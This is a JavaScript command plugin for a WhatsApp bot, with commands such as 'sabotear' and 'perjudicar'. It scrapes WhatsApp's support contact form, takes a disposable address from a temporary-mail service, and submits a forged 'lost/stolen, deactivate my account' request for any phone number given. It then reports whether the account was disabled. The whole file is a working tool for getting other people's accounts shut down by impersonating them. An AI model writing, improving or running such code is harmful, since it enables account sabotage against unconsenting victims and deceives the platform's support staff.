import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    const q = args.join(" ");    
    if (!q || !args[0]) throw '[⁉️] Ingrese el número en formato internacional. Ejemplo: +1 (890) 555-555';

    try {
        let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
        let cookie = ntah.headers["set-cookie"]?.join("; ") || "";

        let $ = cheerio.load(ntah.data);
        let $form = $("form");
        if (!$form.length) throw 'No se encontró el formulario de WhatsApp';

        let url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        let form = new URLSearchParams();
        
        form.append("jazoest", $form.find("input[name=jazoest]").val() || "");
        form.append("lsd", $form.find("input[name=lsd]").val() || "");
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", q);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta: " + q);
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        let res = await axios({
            url,
            method: "POST",
            data: form,
            headers: { cookie }
        });

        let payload = String(res.data).replace("for (;;);", "");
        let jsonResponse;

        try {
            jsonResponse = JSON.parse(payload);
        } catch (e) {
            throw 'Error procesando la respuesta del servidor';
        }

        if (jsonResponse.payload === true) {
            m.reply(`❕𝗗𝗘𝗦𝗔𝗖𝗧𝗜𝗩𝗔𝗡𝗗𝗢❕\n\n##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrarla.`);
        } else if (jsonResponse.payload === false) {
            m.reply(`❗𝗜𝗡𝗙𝗢❗\n\n##- WhatsApp Support -##\n\nHola:\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Envíanos documentación que nos permita verificarlo.`);
        } else {
            m.reply(util.format(jsonResponse));
        }
    } catch (e) {
        console.error(e);
        m.reply('⚠️ Ocurrió un error al procesar la solicitud.');
    }
};

handler.tags = ['owner'];
handler.command = /^(whatsappsp|orden|sabotear|perjudicar|desactivar|manipular|protocolo|alterar)$/i;
handler.rowner = true;

export default handler;